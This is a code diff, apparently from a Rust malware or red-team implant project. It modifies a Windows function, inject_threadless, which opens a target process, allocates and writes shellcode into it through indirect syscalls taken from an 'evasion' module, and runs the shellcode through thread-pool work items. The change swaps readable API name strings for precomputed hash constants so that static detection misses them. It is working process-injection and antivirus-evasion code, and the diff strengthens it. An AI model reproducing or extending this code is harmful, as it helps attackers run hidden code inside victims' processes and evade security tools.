@@ -21,14 +21,15 @@ struct TlClientId {
 
 #[cfg(target_os = "windows")]
 pub unsafe fn inject_threadless(target_pid: u32, shellcode: &[u8]) -> bool {
-    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
-    use crate::evasion::syscalls::{get_ssn, indirect_syscall};
+    use crate::resolve::api_hash::{djb2_hash_lower, peb_get_module_base, resolve_by_hash};
+    use crate::resolve::api_hash::h;
+    use crate::evasion::syscalls::{get_ssn_h, indirect_syscall};
 
     let mut oa_tl: TlObjectAttributes = core::mem::zeroed();
     oa_tl.length = core::mem::size_of::<TlObjectAttributes>() as u32;
     let mut cid_tl: TlClientId = core::mem::zeroed();
     cid_tl.unique_process = target_pid as usize;
-    let (ssn_open, tramp_open) = match get_ssn(b"NtOpenProcess") {
+    let (ssn_open, tramp_open) = match get_ssn_h(h::NT_OPEN_PROC) {
         Some(v) => v, None => return false,
     };
     let mut h_proc: isize = 0;
@@ -42,20 +43,20 @@ pub unsafe fn inject_threadless(target_pid: u32, shellcode: &[u8]) -> bool {
     );
     if open_status < 0 || h_proc == 0 { return false; }
 
-    let nt_close = |h: isize| {
-        if let Some((ssn_c, tramp_c)) = get_ssn(b"NtClose") {
-            indirect_syscall(ssn_c, tramp_c, h as usize, 0, 0, 0, 0, 0);
+    let nt_close = |h_val: isize| {
+        if let Some((ssn_c, tramp_c)) = get_ssn_h(h::NT_CLOSE) {
+            indirect_syscall(ssn_c, tramp_c, h_val as usize, 0, 0, 0, 0, 0);
         }
     };
 
     // NtAllocateVirtualMemory for cross-process shellcode region
-    let (alloc_ssn, alloc_tramp) = match get_ssn(b"NtAllocateVirtualMemory") {
+    let (alloc_ssn, alloc_tramp) = match get_ssn_h(h::NT_ALLOC_VM) {
         Some(x) => x, None => { nt_close(h_proc); return false; }
     };
-    let (prot_ssn, prot_tramp) = match get_ssn(b"NtProtectVirtualMemory") {
+    let (prot_ssn, prot_tramp) = match get_ssn_h(h::NT_PROT_VM) {
         Some(x) => x, None => { nt_close(h_proc); return false; }
     };
-    let (wvm_ssn, wvm_tramp) = match get_ssn(b"NtWriteVirtualMemory") {
+    let (wvm_ssn, wvm_tramp) = match get_ssn_h(h::NT_WRITE_VM) {
         Some(x) => x, None => { nt_close(h_proc); return false; }
     };
 
@@ -108,9 +109,9 @@ pub unsafe fn inject_threadless(target_pid: u32, shellcode: &[u8]) -> bool {
     };
     if ntdll.is_null() { nt_close(h_proc); return false; }
 
-    let tp_alloc   = match resolve_by_hash(ntdll, djb2_hash(b"TpAllocWork"))   { Some(p) => p, None => { nt_close(h_proc); return false; } };
-    let tp_post    = match resolve_by_hash(ntdll, djb2_hash(b"TpPostWork"))    { Some(p) => p, None => { nt_close(h_proc); return false; } };
-    let tp_release = match resolve_by_hash(ntdll, djb2_hash(b"TpReleaseWork")) { Some(p) => p, None => { nt_close(h_proc); return false; } };
+    let tp_alloc   = match resolve_by_hash(ntdll, h::TP_ALLOC_W)   { Some(p) => p, None => { nt_close(h_proc); return false; } };
+    let tp_post    = match resolve_by_hash(ntdll, h::TP_POST_W)    { Some(p) => p, None => { nt_close(h_proc); return false; } };
+    let tp_release = match resolve_by_hash(ntdll, h::TP_REL_W) { Some(p) => p, None => { nt_close(h_proc); return false; } };
 
     type TpAllocWorkFn   = unsafe extern "system" fn(*mut usize, *mut core::ffi::c_void, *mut core::ffi::c_void, usize) -> i32;
     type TpPostWorkFn    = unsafe extern "system" fn(usize);
@@ -130,7 +131,7 @@ pub unsafe fn inject_threadless(target_pid: u32, shellcode: &[u8]) -> bool {
 
     tp_post_fn(work_item);
     let delay_100ns: i64 = -(500 * 10_000i64);
-    if let Some((ssn_d, tramp_d)) = get_ssn(b"NtDelayExecution") {
+    if let Some((ssn_d, tramp_d)) = get_ssn_h(h::NT_DELAY) {
         indirect_syscall(ssn_d, tramp_d, 0, &delay_100ns as *const i64 as usize, 0, 0, 0, 0);
     }
     tp_release_fn(work_item);
